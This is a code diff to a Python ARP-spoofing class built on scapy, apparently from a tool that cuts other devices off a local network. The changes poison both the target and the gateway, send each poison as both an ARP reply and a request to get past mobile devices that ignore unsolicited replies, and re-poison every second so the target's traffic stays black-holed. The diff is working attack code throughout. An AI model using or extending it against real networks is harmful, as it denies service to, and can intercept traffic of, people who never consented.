@@ -40,6 +40,15 @@ class ARPSpoofer:
         self._lock = threading.Lock()
         self._static_arp_set = False
 
+    @property
+    def _iface(self) -> Optional[str]:
+        """The scapy interface to send/receive on — mirrors the scanner's choice."""
+        try:
+            from network.scanner import network_scanner
+            return network_scanner.scan_iface
+        except Exception:
+            return None
+
     def _ensure_gateway_info(self):
         """Resolve gateway IP and MAC address."""
         if self._gateway_mac and self._gateway_ip:
@@ -52,7 +61,7 @@ class ARPSpoofer:
             return False
 
         try:
-            self._local_mac = get_if_hwaddr(conf.iface)
+            self._local_mac = get_if_hwaddr(self._iface or conf.iface)
         except Exception:
             self._local_mac = "00:00:00:00:00:00"
 
@@ -66,6 +75,20 @@ class ARPSpoofer:
         logger.info(f"Gateway: {self._gateway_ip} ({self._gateway_mac}), "
                      f"Local MAC: {self._local_mac}, Interface idx: {self._iface_index}")
         return True
+
+    def reset_gateway_info(self):
+        """Clear cached gateway/interface state so it is re-resolved on next use.
+
+        Called when the scan interface changes; stops any active spoofing first
+        so we don't leave devices poisoned against a stale gateway.
+        """
+        self.restore_all()
+        with self._lock:
+            self._gateway_ip = None
+            self._gateway_mac = None
+            self._local_mac = None
+            self._iface_index = None
+        logger.info("ARP spoofer gateway info reset")
 
     def _get_gateway_interface_index(self) -> Optional[int]:
         """Get the Windows interface index for the interface that reaches the gateway."""
@@ -143,38 +166,74 @@ class ARPSpoofer:
             return None
         try:
             pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
-            result = srp(pkt, timeout=3, verbose=0)[0]
+            iface = self._iface
+            if iface:
+                result = srp(pkt, timeout=3, verbose=0, iface=iface)[0]
+            else:
+                result = srp(pkt, timeout=3, verbose=0)[0]
             if result:
                 return result[0][1].hwsrc
         except Exception as e:
             logger.error(f"Failed to resolve MAC for {ip}: {e}")
         return None
 
+    def _send(self, pkt):
+        """Send a crafted packet on the scan interface, ignoring send errors."""
+        iface = self._iface
+        try:
+            if iface:
+                sendp(pkt, verbose=0, iface=iface)
+            else:
+                sendp(pkt, verbose=0)
+        except Exception as e:
+            logger.debug(f"ARP send failed: {e}")
+
     def _spoof_target(self, target_ip: str, target_mac: str):
-        """Send ARP reply telling target that the gateway is at our MAC."""
+        """Poison both the target and the gateway so the target's traffic is
+        black-holed.
+
+        Poisoning is bidirectional: the target is told the gateway lives at
+        our MAC, and the gateway is told the target lives at our MAC. Each
+        direction is sent as both an ARP reply (op=2) and an ARP request
+        (op=1) — many mobile stacks ignore unsolicited replies but still
+        cache the sender of a request, which is why a reply-only spoof wears
+        off after the phone re-validates its neighbor entry (~30s).
+        """
         if not SCAPY_AVAILABLE:
             return
-        pkt = Ether(dst=target_mac) / ARP(
-            op=2,
-            pdst=target_ip,
-            hwdst=target_mac,
-            psrc=self._gateway_ip
-        )
-        sendp(pkt, verbose=0)
+
+        # 1) Tell the target that the gateway is at our MAC.
+        self._send(Ether(dst=target_mac) / ARP(
+            op=2, pdst=target_ip, hwdst=target_mac, psrc=self._gateway_ip))
+        self._send(Ether(dst=target_mac) / ARP(
+            op=1, pdst=target_ip, hwdst=target_mac, psrc=self._gateway_ip))
+
+        # 2) Tell the gateway that the target is at our MAC (return path).
+        if self._gateway_mac:
+            self._send(Ether(dst=self._gateway_mac) / ARP(
+                op=2, pdst=self._gateway_ip, hwdst=self._gateway_mac, psrc=target_ip))
+            self._send(Ether(dst=self._gateway_mac) / ARP(
+                op=1, pdst=self._gateway_ip, hwdst=self._gateway_mac, psrc=target_ip))
 
     def _restore_target(self, target_ip: str, target_mac: str):
-        """Send correct ARP reply to restore the target's gateway entry."""
+        """Undo the poison in both directions: restore the target's view of
+        the gateway and the gateway's view of the target."""
         if not SCAPY_AVAILABLE or not self._gateway_mac:
             return
-        pkt = Ether(dst=target_mac) / ARP(
-            op=2,
-            pdst=target_ip,
-            hwdst=target_mac,
-            psrc=self._gateway_ip,
-            hwsrc=self._gateway_mac
-        )
+
+        # Restore the target's gateway entry (gateway_ip -> real gateway MAC).
+        to_target = Ether(dst=target_mac) / ARP(
+            op=2, pdst=target_ip, hwdst=target_mac,
+            psrc=self._gateway_ip, hwsrc=self._gateway_mac)
+
+        # Restore the gateway's target entry (target_ip -> real target MAC).
+        to_gateway = Ether(dst=self._gateway_mac) / ARP(
+            op=2, pdst=self._gateway_ip, hwdst=self._gateway_mac,
+            psrc=target_ip, hwsrc=target_mac)
+
         for _ in range(3):
-            sendp(pkt, verbose=0)
+            self._send(to_target)
+            self._send(to_gateway)
             time.sleep(0.2)
 
     def _spoof_loop(self, target_ip: str):
@@ -198,8 +257,14 @@ class ARPSpoofer:
                 mac = target.mac
 
             if limit_kbps == 0:
-                self._spoof_target(target_ip, mac)
-                time.sleep(0.5)
+                try:
+                    self._spoof_target(target_ip, mac)
+                except Exception as e:
+                    logger.debug(f"spoof iteration failed for {target_ip}: {e}")
+                # Re-poison well within the target's neighbor-cache lifetime
+                # (~15-30s on mobile) so the entry never re-validates against
+                # the real gateway.
+                time.sleep(1.0)
             else:
                 if max_kbps > 0:
                     allow_ratio = min(1.0, limit_kbps / max_kbps)
